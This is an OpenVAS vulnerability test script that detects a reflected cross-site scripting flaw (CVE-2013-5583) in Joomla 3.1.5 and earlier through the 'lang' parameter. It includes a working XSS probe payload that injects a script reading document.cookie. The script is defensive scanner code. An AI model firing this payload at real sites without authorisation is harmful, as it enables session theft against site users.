###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_lang_parm_xss_vuln.nasl 34118 2014-01-06 12:53:52Z Jan$
#
# Joomla! 'lang' Parameter Reflected Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804057");
  script_version("$Revision: 11108 $");
  script_cve_id("CVE-2013-5583");
  script_bugtraq_id(61600);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
  script_tag(name:"creation_date", value:"2014-01-06 12:53:52 +0530 (Mon, 06 Jan 2014)");

  script_name("Joomla! 'lang' Parameter Reflected Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Joomla and is prone to cross site scripting
vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to
read cookie or not.");

  script_tag(name:"solution", value:"Upgrade to Joomla version 3.1.6 or later.");

  script_tag(name:"insight", value:"Input passed via the 'lang' parameter to
'/libraries/idna_convert/example.php' script is not properly sanitized before being returned to the user.");

  script_tag(name:"affected", value:"Joomla version 3.1.5 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54353");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Aug/27");
  script_xref(name:"URL", value:"https://github.com/joomla/joomla-cms/issues/1658");
  script_xref(name:"URL", value:"http://disse.cting.org/2013/08/05/joomla-core-3_1_5_reflected-xss-vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!jPort = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:jPort))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/libraries/idna_convert/example.php?lang=";><script>alert(document.cookie);</script><!--';

if (http_vuln_check(port:jPort, url:url, check_header:TRUE, pattern:"><script>alert\(document.cookie\);</script>",
                   extra_check:">phlyLabs")) {
  report = report_vuln_url( port:jPort, url:url );
  security_message(port:jPort, data:report);
  exit(0);
}

exit(99);
